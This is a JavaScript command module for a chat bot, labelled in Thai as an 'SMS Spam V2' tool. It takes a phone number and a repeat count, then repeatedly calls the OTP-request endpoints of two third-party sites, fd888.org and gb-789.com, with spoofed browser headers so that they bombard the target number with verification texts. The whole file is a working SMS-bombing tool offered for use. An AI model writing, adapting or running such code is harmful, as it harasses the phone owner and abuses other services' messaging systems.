
const axios = require('axios');

module.exports = {
  config: {
    name: "sms",
    version: "1.0.0", 
    description: "ส่ง SMS ผ่าน Multi-API",
    usage: "/sms2 <เบอร์> <จำนวน>",
    aliases: ["fd888"],
  },
  run: async ({ api, event, args }) => {
    const { senderID } = event;

    if (args.length < 2) {
      return api.sendMessage(senderID, `
✨ **คำสั่งเทพ SMS Spam V2** ✨
❌ รูปแบบไม่ถูกต้อง!
📜 ใช้: /sms2 <เบอร์ 10 หลัก> <จำนวนครั้ง>
💡 ตัวอย่าง: /sms2 0987456321 5
      `);
    }

    const phone = args[0];
    const count = parseInt(args[1]);

    if (!/^\d{10}$/.test(phone)) {
      return api.sendMessage(senderID, `
⚠️ **ERROR DETECTED** ⚠️
📞 เบอร์โทรต้องเป็นตัวเลข 10 หลักเท่านั้น!
💢 ตัวอย่าง: 0987456321
      `);
    }

    if (isNaN(count) || count < 1 || count > 20) {
      return api.sendMessage(senderID, `
⚠️ **INVALID COUNT** ⚠️
🔢 จำนวนครั้งต้องเป็นตัวเลขระหว่าง 1-20
      `);
    }

    const url = "https://service.fd888.org/api/user/request-otp";
    const headers = {
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "en-US,en;q=0.9",
      "Content-Type": "application/json;charset=UTF-8",
      "Origin": "https://fd888.org",
      "Referer": "https://fd888.org/",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    };

    try {
      await api.sendMessage(senderID, `
🔥 **เริ่มการสแปม SMS (Multi-API)** 🔥
📞 เป้าหมาย: ${phone}
🎯 จำนวน: ${count} ครั้ง
⚡ ความเร็ว: เร็วสุด
👾 **ยิงโดย**: โทมัส V3
      `);

      let successCount = 0;
      for (let i = 0; i < count; i++) {
        try {
          // Call FD888 API
          const response1 = await axios.post(url, { phone }, { headers });

          // Call GB-789 API
          const gb789url = "https://gb-789.com/api/tiamut/otp";
          const gb789headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "th",
            "Content-Type": "application/json",
            "My-Domain": "gb-789.com",
            "Origin": "https://gb-789.com",
            "Referer": "https://gb-789.com/?action=register",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
          };
          const response2 = await axios.post(gb789url, { phone }, { headers: gb789headers });

          if (response1.status === 200 || response2.status === 200) {
            successCount++;
          }
        } catch (error) {
          continue;
        }
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 วินาทีต่อรอบ
      }

      await api.sendMessage(senderID, `
✅ **ส่ง SMS เสร็จสิ้น!**
📞 เบอร์: ${phone}
📊 สำเร็จ: ${successCount}/${count} ครั้ง
🚀 ยิงพร้อมกัน 2 API!
      `);

    } catch (error) {
      console.error("❌ เกิดข้อผิดพลาด:", error.message);
      return api.sendMessage(senderID, `
💥 **SYSTEM FAILURE** 💥
❌ ไม่สามารถส่ง SMS ได้!
📢 เหตุผล: ${error.message}
⏲️ ลองใหม่ภายหลัง!
      `);
    }
  }
};
